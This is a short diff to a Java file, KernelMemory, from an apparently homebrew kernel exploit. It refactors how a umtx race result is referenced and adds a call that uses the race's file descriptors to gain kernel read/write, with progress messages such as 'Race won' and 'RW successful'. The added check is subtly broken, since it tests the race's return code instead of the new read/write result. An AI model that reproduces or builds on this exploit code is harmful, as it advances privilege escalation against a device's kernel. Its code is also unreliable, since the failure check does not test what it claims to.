@@ -8,7 +8,6 @@ import java.util.ArrayList;
 import java.util.HashSet;
 
 import org.homebrew.umtx.Exploit;
-import org.homebrew.umtx.RaceResult;
 
 public class KernelMemory {
     // BSD macros
@@ -580,12 +579,18 @@ public class KernelMemory {
 	    return;
 	}
 	println("  [*] Triggering umtx race...");
-	RaceResult raceResult = umtxExploit.race();
+	Exploit.RaceResult raceResult = umtxExploit.race();
 	if (raceResult.returnCode != 0) {
 		println("  [+] Race failed, returnCode: " + raceResult.returnCode);
 		return;
 	}
 	println("  [+] Race won after " + raceResult.numTries + " tries, lookupFd: " + raceResult.lookupFd + " reclaimFd: " + raceResult.reclaimFd);
+	Exploit.RWResult rwResult = umtxExploit.getRW(raceResult.lookupFd, raceResult.reclaimFd);
+	if (raceResult.returnCode != 0) {
+		println("  [+] RW failed, returnCode: " + rwResult.returnCode);
+		return;
+	}
+	println("  [+] RW successful");
     }
 
     public static long getBaseAddress() throws IOException {
